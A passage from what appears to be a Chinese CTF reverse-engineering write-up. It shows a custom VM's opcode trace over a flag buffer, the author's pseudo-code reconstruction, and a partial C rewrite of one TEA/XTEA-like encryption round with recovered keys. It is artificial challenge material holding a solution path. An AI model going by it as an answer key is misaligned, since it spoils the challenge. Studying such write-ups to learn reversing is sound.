class="number">21</span>] = <span class="number">1</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">16</span></span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">21</span>] = <span class="number">0x13</span></span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">22</span>] = <span class="number">0x13</span></span><br><span class="line">------&gt;OPCODE :<span class="number">9</span></span><br><span class="line">pFlag[<span class="number">22</span>] = <span class="number">0</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">23</span>] = <span class="number">0x2</span></span><br><span class="line">------&gt;OPCODE :<span class="number">0</span></span><br><span class="line">pFlag[<span class="number">22</span>] = pFlag[<span class="number">23</span>]:<span class="number">0x2</span> + pFlag[<span class="number">22</span>]:<span class="number">0</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">8</span></span><br><span class="line">pFlag[<span class="number">19</span>] = <span class="number">0x2</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">15</span></span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">21</span>] = <span class="number">0x13</span></span><br><span class="line">------&gt;OPCODE :<span class="number">9</span></span><br><span class="line">pFlag[<span class="number">21</span>] = <span class="number">0x2</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">22</span>] = <span class="number">0xa</span></span><br><span class="line">------&gt;OPCODE :<span class="number">12</span></span><br><span class="line">exchange pFlag[<span class="number">22</span>]:<span class="number">0x2</span>, pFlag[<span class="number">21</span>]:<span class="number">0xa</span></span><br><span class="line">------&gt;OPCODE :<span class="number">1</span></span><br><span class="line">pFlag[<span class="number">21</span>] = pFlag[<span class="number">22</span>]:<span class="number">0x2</span> - pFlag[<span class="number">21</span>]:<span class="number">0xa</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">11</span></span><br><span class="line">pFlag[<span class="number">21</span>] = <span class="number">1</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">10</span></span><br><span class="line">pFlag[<span class="number">21</span>] = <span class="number">0</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">16</span></span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">21</span>] = <span class="number">0x14</span></span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">22</span>] = <span class="number">0</span></span><br><span class="line">------&gt;OPCODE :<span class="number">8</span></span><br><span class="line">pFlag[<span class="number">20</span>] = <span class="number">0</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">21</span>] = <span class="number">0x14</span></span><br><span class="line">------&gt;OPCODE :<span class="number">9</span></span><br><span class="line">pFlag[<span class="number">21</span>] = <span class="number">0</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">22</span>] = <span class="number">0x14</span></span><br><span class="line">------&gt;OPCODE :<span class="number">12</span></span><br><span class="line">exchange pFlag[<span class="number">22</span>]:<span class="number">0</span>, pFlag[<span class="number">21</span>]:<span class="number">0x14</span></span><br><span class="line">------&gt;OPCODE :<span class="number">1</span></span><br><span class="line">pFlag[<span class="number">21</span>] = pFlag[<span class="number">22</span>]:<span class="number">0</span> - pFlag[<span class="number">21</span>]:<span class="number">0x14</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">11</span></span><br><span class="line">pFlag[<span class="number">21</span>] = <span class="number">1</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">10</span></span><br><span class="line">pFlag[<span class="number">21</span>] = <span class="number">0</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">16</span></span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">21</span>] = <span class="number">0xc</span></span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">22</span>] = <span class="number">0x13</span></span><br><span class="line">------&gt;OPCODE :<span class="number">9</span></span><br><span class="line">pFlag[<span class="number">22</span>] = <span class="number">0x2</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">23</span>] = <span class="number">0</span></span><br><span class="line">------&gt;OPCODE :<span class="number">0</span></span><br><span class="line">pFlag[<span class="number">22</span>] = pFlag[<span class="number">23</span>]:<span class="number">0</span> + pFlag[<span class="number">22</span>]:<span class="number">0x2</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">9</span></span><br><span class="line">pFlag[<span class="number">22</span>] = <span class="number">0xcc1f6a59</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">8</span></span><br><span class="line">pFlag[<span class="number">12</span>] = <span class="number">0xcc1f6a59</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">21</span>] = <span class="number">0xd</span></span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">22</span>] = <span class="number">0x13</span></span><br><span class="line">------&gt;OPCODE :<span class="number">9</span></span><br><span class="line">pFlag[<span class="number">22</span>] = <span class="number">0x2</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">23</span>] = <span class="number">0x1</span></span><br><span class="line">------&gt;OPCODE :<span class="number">0</span></span><br><span class="line">pFlag[<span class="number">22</span>] = pFlag[<span class="number">23</span>]:<span class="number">0x1</span> + pFlag[<span class="number">22</span>]:<span class="number">0x2</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">23</span>] = <span class="number">0</span></span><br><span class="line">------&gt;OPCODE :<span class="number">0</span></span><br><span class="line">pFlag[<span class="number">22</span>] = pFlag[<span class="number">23</span>]:<span class="number">0</span> + pFlag[<span class="number">22</span>]:<span class="number">0x3</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">9</span></span><br><span class="line">pFlag[<span class="number">22</span>] = <span class="number">0x11057fdc</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">8</span></span><br><span class="line">pFlag[<span class="number">13</span>] = <span class="number">0x11057fdc</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">21</span>] = <span class="number">0xb</span></span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">22</span>] = <span class="number">0xb</span></span><br><span class="line">------&gt;OPCODE :<span class="number">9</span></span><br><span class="line">pFlag[<span class="number">22</span>] = <span class="number">0x798dcdf9</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">23</span>] = <span class="number">0xa</span></span><br><span class="line">------&gt;OPCODE :<span class="number">9</span></span><br><span class="line">pFlag[<span class="number">23</span>] = <span class="number">0x154cbf7</span>; ======系统中的立即数</span><br><span class="line">------&gt;OPCODE :<span class="number">0</span></span><br><span class="line">pFlag[<span class="number">22</span>] = pFlag[<span class="number">23</span>]:<span class="number">0x154cbf7</span> + pFlag[<span class="number">22</span>]:<span class="number">0x798dcdf9</span>; == 这<span class="number">2</span>个数是固定的</span><br><span class="line">------&gt;OPCODE :<span class="number">8</span></span><br><span class="line">pFlag[<span class="number">11</span>] = <span class="number">0x7ae299f0</span>; =========</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">21</span>] = <span class="number">0xc</span></span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">22</span>] = <span class="number">0xc</span></span><br><span class="line">------&gt;OPCODE :<span class="number">9</span></span><br><span class="line">pFlag[<span class="number">22</span>] = <span class="number">0xcc1f6a59</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">23</span>] = <span class="number">0xd</span></span><br><span class="line">------&gt;OPCODE :<span class="number">9</span></span><br><span class="line">pFlag[<span class="number">23</span>] = <span class="number">0x11057fdc</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">24</span>] = <span class="number">0x10</span></span><br><span class="line">------&gt;OPCODE :<span class="number">2</span></span><br><span class="line">pFlag[<span class="number">23</span>] = pFlag[<span class="number">24</span>]:<span class="number">0x10</span> * pFlag[<span class="number">23</span>]:<span class="number">0x11057fdc</span>;========</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">24</span>] = <span class="number">0</span></span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">25</span>] = <span class="number">0xe</span></span><br><span class="line">------&gt;OPCODE :<span class="number">0</span></span><br><span class="line">pFlag[<span class="number">24</span>] = pFlag[<span class="number">25</span>]:<span class="number">0xe</span> + pFlag[<span class="number">24</span>]:<span class="number">0</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">9</span></span><br><span class="line">pFlag[<span class="number">24</span>] = <span class="number">0x5354</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">0</span></span><br><span class="line">pFlag[<span class="number">23</span>] = pFlag[<span class="number">24</span>]:<span class="number">0x5354</span> + pFlag[<span class="number">23</span>]:<span class="number">0x1057fdc0</span>; =======</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">24</span>] = <span class="number">0xd</span></span><br><span class="line">------&gt;OPCODE :<span class="number">9</span></span><br><span class="line">pFlag[<span class="number">24</span>] = <span class="number">0x11057fdc</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">25</span>] = <span class="number">0xb</span></span><br><span class="line">------&gt;OPCODE :<span class="number">9</span></span><br><span class="line">pFlag[<span class="number">25</span>] = <span class="number">0x7ae299f0</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">0</span></span><br><span class="line">pFlag[<span class="number">24</span>] = pFlag[<span class="number">25</span>]:<span class="number">0x7ae299f0</span> + pFlag[<span class="number">24</span>]:<span class="number">0x11057fdc</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">25</span>] = <span class="number">0xd</span></span><br><span class="line">------&gt;OPCODE :<span class="number">9</span></span><br><span class="line">pFlag[<span class="number">25</span>] = <span class="number">0x11057fdc</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">26</span>] = <span class="number">0x20</span></span><br><span class="line">------&gt;OPCODE :<span class="number">12</span></span><br><span class="line">exchange pFlag[<span class="number">26</span>]:<span class="number">0x11057fdc</span>, pFlag[<span class="number">25</span>]:<span class="number">0x20</span></span><br><span class="line">------&gt;OPCODE :<span class="number">3</span></span><br><span class="line">pFlag[<span class="number">25</span>] = pFlag[<span class="number">26</span>]:<span class="number">0x11057fdc</span> / pFlag[<span class="number">25</span>]:<span class="number">0x20</span>;### <span class="number">0x882bfe</span></span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">26</span>] = <span class="number">0x1</span></span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">27</span>] = <span class="number">0xe</span></span><br><span class="line">------&gt;OPCODE :<span class="number">0</span></span><br><span class="line">pFlag[<span class="number">26</span>] = pFlag[<span class="number">27</span>]:<span class="number">0xe</span> + pFlag[<span class="number">26</span>]:<span class="number">0x1</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">9</span></span><br><span class="line">pFlag[<span class="number">26</span>] = <span class="number">0x4f4d</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">0</span></span><br><span class="line">pFlag[<span class="number">25</span>] = pFlag[<span class="number">26</span>]:<span class="number">0x4f4d</span> + pFlag[<span class="number">25</span>]:<span class="number">0x882bfe</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">7</span></span><br><span class="line">pFlag[<span class="number">24</span>] = pFlag[<span class="number">25</span>]:<span class="number">0x887b4b</span> ^ pFlag[<span class="number">24</span>]:<span class="number">0x8be819cc</span>; =====</span><br><span class="line">------&gt;OPCODE :<span class="number">7</span></span><br><span class="line">pFlag[<span class="number">23</span>] = pFlag[<span class="number">24</span>]:<span class="number">0x8b606287</span> ^ pFlag[<span class="number">23</span>]:<span class="number">0x10585114</span>;==</span><br><span class="line">------&gt;OPCODE :<span class="number">0</span></span><br><span class="line">pFlag[<span class="number">22</span>] = pFlag[<span class="number">23</span>]:<span class="number">0x9b383393</span> + pFlag[<span class="number">22</span>]:<span class="number">0xcc1f6a59</span>;=====</span><br><span class="line">------&gt;OPCODE :<span class="number">8</span></span><br><span class="line">pFlag[<span class="number">12</span>] = <span class="number">0x67579dec</span>;######</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">21</span>] = <span class="number">0xd</span></span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">22</span>] = <span class="number">0xd</span></span><br><span class="line">------&gt;OPCODE :<span class="number">9</span></span><br><span class="line">pFlag[<span class="number">22</span>] = <span class="number">0x11057fdc</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">23</span>] = <span class="number">0xc</span></span><br><span class="line">------&gt;OPCODE :<span class="number">9</span></span><br><span class="line">pFlag[<span class="number">23</span>] = <span class="number">0x67579dec</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">24</span>] = <span class="number">0x10</span></span><br><span class="line">------&gt;OPCODE :<span class="number">2</span></span><br><span class="line">pFlag[<span class="number">23</span>] = pFlag[<span class="number">24</span>]:<span class="number">0x10</span> * pFlag[<span class="number">23</span>]:<span class="number">0x67579dec</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">24</span>] = <span class="number">0x2</span></span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">25</span>] = <span class="number">0xe</span></span><br><span class="line">------&gt;OPCODE :<span class="number">0</span></span><br><span class="line">pFlag[<span class="number">24</span>] = pFlag[<span class="number">25</span>]:<span class="number">0xe</span> + pFlag[<span class="number">24</span>]:<span class="number">0x2</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">9</span></span><br><span class="line">pFlag[<span class="number">24</span>] = <span class="number">0x2074</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">0</span></span><br><span class="line">pFlag[<span class="number">23</span>] = pFlag[<span class="number">24</span>]:<span class="number">0x2074</span> + pFlag[<span class="number">23</span>]:<span class="number">0x7579dec0</span>;=== <span class="number">49</span></span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">24</span>] = <span class="number">0xc</span></span><br><span class="line">------&gt;OPCODE :<span class="number">9</span></span><br><span class="line">pFlag[<span class="number">24</span>] = <span class="number">0x67579dec</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">25</span>] = <span class="number">0xb</span></span><br><span class="line">------&gt;OPCODE :<span class="number">9</span></span><br><span class="line">pFlag[<span class="number">25</span>] = <span class="number">0x7ae299f0</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">0</span></span><br><span class="line">pFlag[<span class="number">24</span>] = pFlag[<span class="number">25</span>]:<span class="number">0x7ae299f0</span> + pFlag[<span class="number">24</span>]:<span class="number">0x67579dec</span>;=====</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">25</span>] = <span class="number">0xc</span></span><br><span class="line">------&gt;OPCODE :<span class="number">9</span></span><br><span class="line">pFlag[<span class="number">25</span>] = <span class="number">0x67579dec</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">26</span>] = <span class="number">0x20</span></span><br><span class="line">------&gt;OPCODE :<span class="number">12</span></span><br><span class="line">exchange pFlag[<span class="number">26</span>]:<span class="number">0x67579dec</span>, pFlag[<span class="number">25</span>]:<span class="number">0x20</span></span><br><span class="line">------&gt;OPCODE :<span class="number">3</span></span><br><span class="line">pFlag[<span class="number">25</span>] = pFlag[<span class="number">26</span>]:<span class="number">0x67579dec</span> / pFlag[<span class="number">25</span>]:<span class="number">0x20</span>;===<span class="string">&#x27;0x33abcef&#x27;</span></span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">26</span>] = <span class="number">0x3</span></span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">27</span>] = <span class="number">0xe</span></span><br><span class="line">------&gt;OPCODE :<span class="number">0</span></span><br><span class="line">pFlag[<span class="number">26</span>] = pFlag[<span class="number">27</span>]:<span class="number">0xe</span> + pFlag[<span class="number">26</span>]:<span class="number">0x3</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">9</span></span><br><span class="line">pFlag[<span class="number">26</span>] = <span class="number">0x6561</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">0</span></span><br><span class="line">pFlag[<span class="number">25</span>] = pFlag[<span class="number">26</span>]:<span class="number">0x6561</span> + pFlag[<span class="number">25</span>]:<span class="number">0x33abcef</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">7</span></span><br><span class="line">pFlag[<span class="number">24</span>] = pFlag[<span class="number">25</span>]:<span class="number">0x33b2250</span> ^ pFlag[<span class="number">24</span>]:<span class="number">0xe23a37dc</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">7</span></span><br><span class="line">pFlag[<span class="number">23</span>] = pFlag[<span class="number">24</span>]:<span class="number">0xe101158c</span> ^ pFlag[<span class="number">23</span>]:<span class="number">0x7579ff34</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">0</span></span><br><span class="line">pFlag[<span class="number">22</span>] = pFlag[<span class="number">23</span>]:<span class="number">0x9478eab8</span> + pFlag[<span class="number">22</span>]:<span class="number">0x11057fdc</span>; # <span class="string">&#x27;0xa57e6a94&#x27;</span></span><br><span class="line">------&gt;OPCODE :<span class="number">8</span></span><br><span class="line">pFlag[<span class="number">13</span>] = <span class="number">0xa57e6a94</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">21</span>] = <span class="number">0x13</span></span><br><span class="line">------&gt;OPCODE :<span class="number">9</span></span><br><span class="line">pFlag[<span class="number">21</span>] = <span class="number">0x2</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">22</span>] = <span class="number">0</span></span><br><span class="line">------&gt;OPCODE :<span class="number">0</span></span><br><span class="line">pFlag[<span class="number">21</span>] = pFlag[<span class="number">22</span>]:<span class="number">0</span> + pFlag[<span class="number">21</span>]:<span class="number">0x2</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">22</span>] = <span class="number">0xc</span></span><br><span class="line">------&gt;OPCODE :<span class="number">9</span></span><br><span class="line">pFlag[<span class="number">22</span>] = <span class="number">0x67579dec</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">8</span></span><br><span class="line">pFlag[<span class="number">2</span>] = <span class="number">0x67579dec</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">21</span>] = <span class="number">0x13</span></span><br><span class="line">------&gt;OPCODE :<span class="number">9</span></span><br><span class="line">pFlag[<span class="number">21</span>] = <span class="number">0x2</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">22</span>] = <span class="number">0x1</span></span><br><span class="line">------&gt;OPCODE :<span class="number">0</span></span><br><span class="line">pFlag[<span class="number">21</span>] = pFlag[<span class="number">22</span>]:<span class="number">0x1</span> + pFlag[<span class="number">21</span>]:<span class="number">0x2</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">22</span>] = <span class="number">0</span></span><br><span class="line">------&gt;OPCODE :<span class="number">0</span></span><br><span class="line">pFlag[<span class="number">21</span>] = pFlag[<span class="number">22</span>]:<span class="number">0</span> + pFlag[<span class="number">21</span>]:<span class="number">0x3</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">22</span>] = <span class="number">0xd</span></span><br><span class="line">------&gt;OPCODE :<span class="number">9</span></span><br><span class="line">pFlag[<span class="number">22</span>] = <span class="number">0xa57e6a94</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">8</span></span><br><span class="line">pFlag[<span class="number">3</span>] = <span class="number">0xa57e6a94</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">18</span></span><br><span class="line">----------------------------------------------------------------------------</span><br></pre></td></tr></table></figure><p><strong>分析算法</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">A = FLAG[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line">B = FLAG[<span class="number">4</span>:<span class="number">8</span>]</span><br><span class="line"></span><br><span class="line">pFlag[<span class="number">23</span>] = B * <span class="number">0x10</span></span><br><span class="line">pFlag[<span class="number">24</span>] = B / <span class="number">0X20</span></span><br><span class="line">pFlag[<span class="number">23</span>] = pFlag[<span class="number">23</span>] ^ pFlag[<span class="number">24</span>]</span><br><span class="line">pFlag[<span class="number">23</span>] = B + pFlag[<span class="number">23</span>]</span><br><span class="line">pFlag[<span class="number">23</span>] = (<span class="number">0xCE0A6E55</span> + <span class="number">0X6F76</span>) ^ pFlag[<span class="number">23</span>]</span><br><span class="line">pFlag[<span class="number">22</span>] = pFlag[<span class="number">23</span>] + A</span><br><span class="line">TMP1 = pFlag[<span class="number">22</span>]  # <span class="number">173</span>行  <span class="number">0xcc1f6a59</span> ***V12导出 # v0</span><br><span class="line"></span><br><span class="line">pFlag[<span class="number">22</span>] = <span class="number">0xCE0A6E55</span> # (过会回来补坑，这个是上一轮循环剩下的) 这个与FLAG无关，是固定的</span><br><span class="line">pFlag[<span class="number">22</span>] = <span class="number">0x75bcd15</span>(立即数) + <span class="number">0xce0a6e55</span></span><br><span class="line">TMP2 = pFlag[<span class="number">22</span>]  # <span class="number">187</span>行  <span class="number">0xd5663b6a</span>   #TMP2 = sum1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pFlag[<span class="number">23</span>] = TMP1</span><br><span class="line">pFlag[<span class="number">23</span>] = TMP1 * <span class="number">0X10</span>  # <span class="number">201</span></span><br><span class="line">pFlag[<span class="number">24</span>] = TMP1 / <span class="number">0x20</span>  # <span class="number">213</span></span><br><span class="line">pFlag[<span class="number">23</span>] = pFlag[<span class="number">23</span>] ^ pFlag[<span class="number">24</span>]</span><br><span class="line">pFlag[<span class="number">23</span>] = TMP1 + pFlag[<span class="number">23</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pFlag[<span class="number">26</span>] = TMP2</span><br><span class="line">pFlag[<span class="number">25</span>] = pFlag[<span class="number">26</span>] / <span class="number">0x800</span>  #<span class="number">233</span>行</span><br><span class="line">pFlag[<span class="number">24</span>] = TMP2 + <span class="number">0x494c</span>   ###<span class="number">245</span></span><br><span class="line">pFlag[<span class="number">23</span>] = pFlag[<span class="number">24</span>] ^ pFlag[<span class="number">23</span>]</span><br><span class="line"></span><br><span class="line">pFlag[<span class="number">22</span>] = pFlag[<span class="number">23</span>] + B </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">TMP3 = pFlag[<span class="number">22</span>]  ### <span class="number">251</span>行   <span class="number">0x11057fdc</span>  ***V12导出   #v1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pFlag[<span class="number">22</span>] = <span class="number">0x154cbf7</span>(立即数) + <span class="number">0x798dcdf9</span>; #这<span class="number">2</span>个数是固定的 #在第一轮的时候是这个，其他的还没测试</span><br><span class="line">TMP4 = pFlag[<span class="number">22</span>] ###<span class="number">407</span>行  <span class="number">0x7ae299f0</span></span><br><span class="line">pFlag[<span class="number">23</span>] = TMP3 * <span class="number">0X10</span></span><br><span class="line">pFlag[<span class="number">23</span>] = pFlag[<span class="number">23</span>] + <span class="number">0X5354</span> # <span class="number">421</span>  </span><br><span class="line">pFlag[<span class="number">24</span>] = TMP4 + TMP3  #<span class="number">441</span> </span><br><span class="line"></span><br><span class="line">pFlag[<span class="number">25</span>] = TMP3 / <span class="number">0x20</span> #<span class="number">451</span>  ### <span class="number">0x882bfe</span></span><br><span class="line">pFlag[<span class="number">25</span>] = <span class="number">0x4f4d</span> + pFlag[<span class="number">25</span>] </span><br><span class="line">pFlag[<span class="number">24</span>] = pFlag[<span class="number">25</span>] ^ pFlag[<span class="number">24</span>]</span><br><span class="line">pFlag[<span class="number">23</span>] = pFlag[<span class="number">24</span>] ^ pFlag[<span class="number">23</span>]  #<span class="number">465</span> ## <span class="number">0x9b383393</span></span><br><span class="line">pFlag[<span class="number">22</span>] = pFlag[<span class="number">23</span>] + TMP1</span><br><span class="line">TMP5 = pFlag[<span class="number">22</span>]   ####<span class="number">469</span>  <span class="number">0x67579dec</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pFlag[<span class="number">23</span>] = TMP5 * <span class="number">0X10</span></span><br><span class="line">pFlag[<span class="number">23</span>] = pFlag[<span class="number">23</span>] + <span class="number">0x2074</span>  ## <span class="number">0x7579ff34</span></span><br><span class="line">pFlag[<span class="number">24</span>] = TMP4 + TMP5  ####<span class="number">503</span>行</span><br><span class="line">pFlag[<span class="number">25</span>] = TMP5 / <span class="number">0x20</span></span><br><span class="line">pFlag[<span class="number">25</span>] = pFlag[<span class="number">25</span>] + <span class="number">0x6561</span></span><br><span class="line">pFlag[<span class="number">24</span>] = pFlag[<span class="number">25</span>] ^ pFlag[<span class="number">24</span>]</span><br><span class="line">pFlag[<span class="number">23</span>] = pFlag[<span class="number">24</span>] ^ pFlag[<span class="number">23</span>]</span><br><span class="line">pFlag[<span class="number">22</span>] = pFlag[<span class="number">23</span>] + TMP3  # <span class="number">529</span>行 <span class="number">0xa57e6a94</span></span><br><span class="line">TMP6 = pFlag[<span class="number">22</span>]  #<span class="number">0xa57e6a94</span></span><br></pre></td></tr></table></figure><p>通过 <code>* 0x10 、/0x20、 /0x800、 &amp;3</code>等特征，猜测是xtea， tea算法</p><p>一边猜一边还原算法,用C语言写出1轮的循环加密算法</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> tea_key[<span class="number">4</span>] = &#123; <span class="number">0X5354</span>, <span class="number">0x4f4d</span>, <span class="number">0x2074</span>, <span class="number">0x6561</span> &#125;;</span><br><span class="line"><span class="keyword">int</span> xtea_key[<span class="number">4</span>] = &#123; <span class="number">0x494c</span>, <span class="number">0X6F76</span> , <span class="number">0x6520</span>, <span class="number">0x4355</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encrypt</span><span class="params">(<span class="keyword">int</span>* v, <span class="keyword">int</span>&amp; sum_xtea, <span class="keyword">int</span>&amp; sum_tea)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">v0 += (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 / <span class="number">0x20</span>)) + v1) ^ (sum_xtea + xtea_key[sum_xtea &amp; <span class="number">3</span>]);</span><br><span class="line">sum_xtea += <span class="number">0x75bcd15</span>;</span><br><span class="line">v1 += (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 / <span class="number">0x20</span>)) + v0) ^ (sum_xtea + 